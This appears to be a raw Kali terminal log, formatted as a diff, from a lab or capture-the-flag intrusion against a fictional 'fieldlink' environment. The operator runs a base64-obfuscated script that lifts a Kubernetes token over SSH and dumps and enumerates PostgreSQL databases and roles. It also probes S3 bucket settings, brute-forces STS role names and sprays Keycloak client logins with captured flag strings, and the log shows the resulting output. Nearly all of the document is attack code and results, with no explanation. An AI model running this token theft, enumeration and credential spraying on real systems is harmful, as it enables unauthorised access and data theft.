@@ -1,0 +1,237 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r23.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKZXhwb3J0IEFXU19DQV9CVU5ETEU9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKSldUPSQoa3ViZWN0bCBjb25maWcgdmlldyAtLXJhdyAtbyBqc29ucGF0aD0ney51c2Vyc1swXS51c2VyLnRva2VufScpCmVjaG8gIj09PSBEVU1QIFNRTCBURVhUID09PSIKcGdfcmVzdG9yZSAtZiAtIC90bXAvY2guZHVtcCAyPi9kZXYvbnVsbCB8IHNlZCAtbiAnMSw0MDBwJwplY2hvICI9PT0gREIgTElTVCA9PT0iCnBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgJ1xsJyAyPiYxIHwgaGVhZCAtMzAKZWNobyAiPT09IFRBQkxFUyBleHBvcnQvd29ya3NwYWNlL3B1YmxpYyA9PT0iCnBzcWwgc2VydmljZT1maWVsZGxpbmsgLUF0YyAic2VsZWN0IG4ubnNwbmFtZXx8Jy4nfHxjLnJlbG5hbWV8fCc6J3x8Yy5yZWxraW5kIGZyb20gcGdfY2xhc3MgYyBqb2luIHBnX25hbWVzcGFjZSBuIG9uIG4ub2lkPWMucmVsbmFtZXNwYWNlIHdoZXJlIG4ubnNwbmFtZSBpbiAoJ2V4cG9ydCcsJ3dvcmtzcGFjZScsJ3B1YmxpYycpIGFuZCBjLnJlbGtpbmQgaW4gKCdyJywndicsJ20nLCdwJywnZicpIG9yZGVyIGJ5IDEiIDI+JjEgfCBoZWFkIC02MAplY2hvICI9PT0gRlVOQ1MgPT09Igpwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1BdGMgInNlbGVjdCBuLm5zcG5hbWV8fCcuJ3x8cC5wcm9uYW1lIGZyb20gcGdfcHJvYyBwIGpvaW4gcGdfbmFtZXNwYWNlIG4gb24gbi5vaWQ9cC5wcm9uYW1lc3BhY2Ugd2hlcmUgbi5uc3BuYW1lIGluICgnZXhwb3J0Jywnd29ya3NwYWNlJywncHVibGljJywnc3VwcG9ydCcpIG9yZGVyIGJ5IDEiIDI+JjEgfCBoZWFkIC00MAplY2hvICI9PT0gUk9MRVMgQUxMID09PSIKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtQXRjICJzZWxlY3Qgcm9sbmFtZSxyb2xjYW5sb2dpbixyb2xzdXBlciBmcm9tIHBnX3JvbGVzIG9yZGVyIGJ5IDEiIDI+JjEgfCBoZWFkIC00MAplY2hvICI9PT0gUzMgQlVDS0VUIFBPTElDSUVTID09PSIKZm9yIGIgaW4gZmllbGRsaW5rLWV4cG9ydHMgZmllbGRrZXN0LXdvcmtzcGFjZXM7IGRvCiBlY2hvICIjIyAkYiBwb2xpY3kiOyBhd3MgLS1lbmRwb2ludC11cmwgaHR0cHM6Ly9vYmplY3RzLmtlcGxlcm9wcy50ZXN0IHMzYXBpIGdldC1idWNrZXQtcG9saWN5IC0tYnVja2V0ICRiIDI+JjEgfCBoZWFkIC1jIDEyMDA7IGVjaG8KIGVjaG8gIiMjICRiIGFjbCI7IGF3cyAtLWVuZHBvaW50LXVybCBodHRwczovL29iamVjdHMua2VwbGVyb3BzLnRlc3QgczNhcGkgZ2V0LWJ1Y2tldC1hY2wgLS1idWNrZXQgJGIgMj4mMSB8IGhlYWQgLWMgODAwOyBlY2hvCiBlY2hvICIjIyAkYiBjb3JzIjsgYXdzIC0tZW5kcG9pbnQtdXJsIGh0dHBzOi8vb2JqZWN0cy5rZXBsZXJvcHMudGVzdCBzM2FwaSBnZXQtYnVja2V0LWNvcnMgLS1idWNrZXQgJGIgMj4mMSB8IGhlYWQgLWMgNTAwOyBlY2hvCiBlY2hvICIjIyAkYiBlbmNyeXB0aW9uIjsgYXdzIC0tZW5kcG9pbnQtdXJsIGh0dHBzOi8vb2JqZWN0cy5rZXBsZXJvcHMudGVzdCBzM2FwaSBnZXQtYnVja2V0LWVuY3J5cHRpb24gLS1idWNrZXQgJGIgMj4mMSB8IGhlYWQgLWMgNDAwOyBlY2hvCmRvbmUKZWNobyAiPT09IFNUUyBST0xFIE5BTUUgT1JBQ0xFID09PSIKZm9yIHIgaW4gcm93YW4td29ya3NwYWNlIGZpZWxkbGluay13b3JrbG9hZCBmaWVsZGtlc3Qtd29ya2xvYWQgd29ya2xvYWQgZmllbGRsaW5rIHN1cHBvcnQgc3VwcG9ydC1leHBvcnQgc3VwcG9ydC1leHBvcnQtcmVhZGVyIGV4cG9ydC1yZWFkZXIgZmllbGRrZXN0LWV4cG9ydCBmaWVsZGxpbmstZXhwb3J0IGZpZWxkbGluay1kYXRhIGRhdGEgZXhwb3J0IG9iamVjdHMgY2xvdWQtYXBpIHJvd2FuIHJvd2FuLml0byBmaWVsZGxpbmstY29ubmVjdG9yIGNvbm5lY3RvciBhcndjIGFyd2MtZXhwb3J0IGFkbWluIHJlYWRlcjsgZG8KIG89JChhd3MgLS1lbmRwb2ludC11cmwgaHR0cHM6Ly9vYmplY3RzLmtlcGxlcm9wcy50ZXN0IHN0cyBhc3N1bWUtcm9sZS13aXRoLXdlYi1pZGVudGl0eSAtLXJvbGUtc2Vzc2lvbi1uYW1lIHByb2JlIC0tcm9sZS1hcm4gYXJuOmF3czppYW06OjAwMDAwMDAwMDAwMDpyb2xlLyRyIC0td2ViLWlkZW50aXR5LXRva2VuICIkSldUIiAyPiYxIHwgZ3JlcCAtb0UgJ3JvbGUgbm90IGZvdW5kOiBbXiBdKnxBY2Nlc3NEZW5pZWR8QW4gZXJyb3Igb2NjdXJyZWQgXChbQS1aYS16XStcKXxDcmVkZW50aWFsc3xub3QgYXV0aG9yaXplZHxhdWRpZW5jZScgfCBoZWFkIC0xKQogZWNobyAiJHIgLT4gJG8iCmRvbmUKZWNobyAiPT09IEtFWUNMT0FLIEJVSUxUSU4gQ0xJRU5UUyBXSVRIIEZMQUcgU0VDUkVUUyA9PT0iCkk9aHR0cHM6Ly9pZGVudGl0eS5rZXBsZXJvcHMudGVzdApmb3IgY2wgaW4gYWRtaW4tY2xpIGFjY291bnQgYWNjb3VudC1jb25zb2xlIHNlY3VyaXR5LWFkbWluLWNvbnNvbGUgYnJva2VyIHJlYWxtLW1hbmFnZW1lbnQ7IGRvCiBmb3IgcyBpbiAiRkxBR3s2YmI2NjA3NGYyMzI1NDA1fSIgIkZMQUd7YWRmYmFiZGNkYWNhOThhY30iOyBkbwogIGZvciByIGluIGtlcGxlcm9wcyBtYXN0ZXI7IGRvCiAgIGNvZGU9JChjdXJsIC1zU2sgLW0gNiAtbyAvdG1wL28gLXcgJyV7aHR0cF9jb2RlfScgLWQgImdyYW50X3R5cGU9Y2xpZW50X2NyZWRlbnRpYWxzJmNsaWVudF9pZD0kY2wmY2xpZW50X3NlY3JldD0kcyIgIiRJL3JlYWxtcy8kci9wcm90b2NvbC9vcGVuaWQtY29ubmVjdC90b2tlbiIpCiAgIGlmIFsgIiRjb2RlIiAhPSAiNDAxIiBdOyB0aGVuIGVjaG8gIiEhICRyIGNsaWVudD0kY2wgc2VjcmV0PSR7czo2OjZ9IC0+ICRjb2RlIDo6ICQoaGVhZCAtYyAyMDAgL3RtcC9vKSI7IGZpCiAgZG9uZQogZG9uZQpkb25lCmVjaG8gImRvbmUga2MiCmVjaG8gIj09PSBNQVNURVIgUkVBTE0gQ0xJRU5UIEVOdW0gPT09Igpmb3IgYyBpbiB3b3Jrc3BhY2UgZmllbGRsaW5rLXdvcmtsb2FkIHN1cHBvcnQtZXhwb3J0LXJlYWRlciBmaWVsZGtlc3Qtd29ya3NwYWNlOyBkbwogY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvbyAtdyAnJXtodHRwX2NvZGV9JyAtZCAiZ3JhbnRfdHlwZT11cm46aWV0ZjpwYXJhbXM6b2F1dGg6Z3JhbnQtdHlwZTp0b2tlbi1leGNoYW5nZSZjbGllbnRfaWQ9JGMiICIkSS9yZWFsbXMvbWFzdGVyL3Byb3RvY29sL29wZW5pZC1jb25uZWN0L3Rva2VuIikKIGVjaG8gIiRjIC0+ICRjb2RlIDo6ICQoaGVhZCAtYyAxMjAgL3RtcC9vKSIKZG9uZQpSU0gKZWNobyBET05FX0sxNF9SMjMK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r23.sh; bash /tmp/k14_r23.sh; echo DONEMARK_1795201754896$((6*7))
+=== DUMP SQL TEXT ===
+--
+-- PostgreSQL database dump
+--
+
+\restrict 43kztNh5Mbw8bbE22WOHLw8fUAYj10qZBjgxIPFPDksvBJ8sGpjZaJZfXnXaYXd
+
+-- Dumped from database version 16.14
+-- Dumped by pg_dump version 16.14
+
+SET statement_timeout = 0;
+SET lock_timeout = 0;
+SET idle_in_transaction_session_timeout = 0;
+SET client_encoding = 'UTF8';
+SET standard_conforming_strings = on;
+SELECT pg_catalog.set_config('search_path', '', false);
+SET check_function_bodies = false;
+SET xmloption = content;
+SET client_min_messages = warning;
+SET row_security = off;
+
+--
+-- Name: support; Type: SCHEMA; Schema: -; Owner: fieldlink_data_owner
+--
+
+CREATE SCHEMA support;
+
+
+ALTER SCHEMA support OWNER TO fieldlink_data_owner;
+
+SET default_tablespace = '';
+
+SET default_table_access_method = heap;
+
+--
+-- Name: customer_migration_history; Type: TABLE; Schema: support; Owner: fieldlink_data_owner
+--
+
+CREATE TABLE support.customer_migration_history (
+    former_name text NOT NULL,
+    former_tenant text NOT NULL,
+    former_revision text NOT NULL,
+    current_tenant text NOT NULL,
+    current_revision text NOT NULL,
+    effective_date date NOT NULL
+);
+
+
+ALTER TABLE support.customer_migration_history OWNER TO fieldlink_data_owner;
+
+--
+-- Name: customer_records; Type: TABLE; Schema: support; Owner: fieldlink_admin
+--
+
+CREATE TABLE support.customer_records (
+    record_id text NOT NULL,
+    tenant text NOT NULL,
+    connector_revision text NOT NULL,
+    asset text NOT NULL,
+    case_ref text NOT NULL,
+    created_at timestamp with time zone DEFAULT now()
+);
+
+
+ALTER TABLE support.customer_records OWNER TO fieldlink_admin;
+
+--
+-- Data for Name: customer_migration_history; Type: TABLE DATA; Schema: support; Owner: fieldlink_data_owner
+--
+
+COPY support.customer_migration_history (former_name, former_tenant, former_revision, current_tenant, current_revision, effective_date) FROM stdin;
+ARWC FieldLink legacy	TEN-ARWC-019	FLK-6.9.8	TEN-ARWC-047	FLK-7.4.2	2026-02-17
+\.
+
+
+--
+-- Data for Name: customer_records; Type: TABLE DATA; Schema: support; Owner: fieldlink_admin
+--
+
+COPY support.customer_records (record_id, tenant, connector_revision, asset, case_ref, created_at) FROM stdin;
+CUSTREC-047-R6	TEN-ARWC-047	FLK-7.4.2	CRR-OG2	SUP-2841	2026-11-19 07:11:35.847891+00
+\.
+
+
+--
+-- Name: customer_migration_history customer_migration_history_pkey; Type: CONSTRAINT; Schema: support; Owner: fieldlink_data_owner
+--
+
+ALTER TABLE ONLY support.customer_migration_history
+    ADD CONSTRAINT customer_migration_history_pkey PRIMARY KEY (former_name);
+
+
+--
+-- Name: customer_records customer_records_pkey; Type: CONSTRAINT; Schema: support; Owner: fieldlink_admin
+--
+
+ALTER TABLE ONLY support.customer_records
+    ADD CONSTRAINT customer_records_pkey PRIMARY KEY (record_id);
+
+
+--
+-- Name: SCHEMA support; Type: ACL; Schema: -; Owner: fieldlink_data_owner
+--
+
+GRANT USAGE ON SCHEMA support TO rowan_data;
+
+
+--
+-- Name: TABLE customer_migration_history; Type: ACL; Schema: support; Owner: fieldlink_data_owner
+--
+
+GRANT SELECT ON TABLE support.customer_migration_history TO rowan_data;
+
+
+--
+-- PostgreSQL database dump complete
+--
+
+\unrestrict 43kztNh5Mbw8bbE22WOHLw8fUAYj10qZBjgxIPFPDksvBJ8sGpjZaJZfXnXaYXd
+
+=== DB LIST ===
+                                                                             List of databases
+        Name        |        Owner         | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules |               Access privileges               
+--------------------+----------------------+----------+-----------------+------------+------------+------------+-----------+-----------------------------------------------
+ fieldlink          | fieldlink_admin      | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
+ fieldlink_data     | fieldlink_data_owner | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | fieldlink_data_owner=CTc/fieldlink_data_owner+
+                    |                      |          |                 |            |            |            |           | rowan_data=c/fieldlink_data_owner
+ fieldlink_identity | fieldlink_identity   | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | fieldlink_identity=CTc/fieldlink_identity
+ fieldlink_staff    | fieldlink_staff      | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | fieldlink_staff=CTc/fieldlink_staff
+ postgres           | fieldlink_admin      | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
+ template0          | fieldlink_admin      | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/fieldlink_admin                           +
+                    |                      |          |                 |            |            |            |           | fieldlink_admin=CTc/fieldlink_admin
+ template1          | fieldlink_admin      | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | =c/fieldlink_admin                           +
+                    |                      |          |                 |            |            |            |           | fieldlink_admin=CTc/fieldlink_admin
+(7 rows)
+
+=== TABLES export/workspace/public ===
+ERROR:  operator is not unique: text || "char"
+LINE 1: select n.nspname||'.'||c.relname||':'||c.relkind from pg_cla...
+                                             ^
+HINT:  Could not choose a best candidate operator. You might need to add explicit type casts.
+=== FUNCS ===
+=== ROLES ALL ===
+fieldlink_admin|t|t
+fieldlink_data_owner|f|f
+fieldlink_identity|t|f
+fieldlink_staff|t|f
+pg_checkpoint|f|f
+pg_create_subscription|f|f
+pg_database_owner|f|f
+pg_execute_server_program|f|f
+pg_monitor|f|f
+pg_read_all_data|f|f
+pg_read_all_settings|f|f
+pg_read_all_stats|f|f
+pg_read_server_files|f|f
+pg_signal_backend|f|f
+pg_stat_scan_tables|f|f
+pg_use_reserved_connections|f|f
+pg_write_all_data|f|f
+pg_write_server_files|f|f
+rowan_data|t|f
+=== S3 BUCKET POLICIES ===
+## fieldlink-exports policy
+
+An error occurred (NoSuchBucketPolicy) when calling the GetBucketPolicy operation: The bucket policy does not exist
+
+## fieldlink-exports acl
+
+An error occurred (AccessDenied) when calling the GetBucketAcl operation: Access Denied.
+
+## fieldlink-exports cors
+
+An error occurred (NoSuchCORSConfiguration) when calling the GetBucketCors operation: The CORS configuration does not exist
+
+## fieldlink-exports encryption
+
+An error occurred (AccessDenied) when calling the GetBucketEncryption operation: Access Denied.
+
+## fieldkest-workspaces policy
+
+An error occurred (AccessDenied) when calling the GetBucketPolicy operation: Access Denied.
+
+## fieldkest-workspaces acl
+
+An error occurred (AccessDenied) when calling the GetBucketAcl operation: Access Denied.
+
+## fieldkest-workspaces cors
+
+An error occurred (AccessDenied) when calling the GetBucketCors operation: Access Denied.
+
+## fieldkest-workspaces encryption
+
+An error occurred (AccessDenied) when calling the GetBucketEncryption operation: Access Denied.
+
+=== STS ROLE NAME ORACLE ===
+rowan-workspace -> An error occurred (AccessDenied)
+fieldlink-workload -> An error occurred (AccessDenied)
+fieldkest-workload -> An error occurred (AccessDenied)
+workload -> An error occurred (AccessDenied)
+fieldlink -> An error occurred (AccessDenied)
+support -> An error occurred (AccessDenied)
+support-export -> An error occurred (AccessDenied)
+support-export-reader -> An error occurred (AccessDenied)
+export-reader -> An error occurred (AccessDenied)
+fieldkest-export -> An error occurred (AccessDenied)
+fieldlink-export -> An error occurred (AccessDenied)
+fieldlink-data -> An error occurred (AccessDenied)
+data -> An error occurred (AccessDenied)
+export -> An error occurred (AccessDenied)
+objects -> An error occurred (AccessDenied)
+cloud-api -> An error occurred (AccessDenied)
+rowan -> An error occurred (AccessDenied)
+rowan.ito -> An error occurred (AccessDenied)
+fieldlink-connector -> An error occurred (AccessDenied)
+connector -> An error occurred (AccessDenied)
+arwc -> An error occurred (AccessDenied)
+arwc-export -> An error occurred (AccessDenied)
+admin -> An error occurred (AccessDenied)
+reader -> An error occurred (AccessDenied)
+=== KEYCLOAK BUILTIN CLIENTS WITH FLAG SECRETS ===
+done kc
+=== MASTER REALM CLIENT ENum ===
+workspace -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+fieldlink-workload -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+support-export-reader -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+fieldkest-workspace -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+DONE_K14_R23
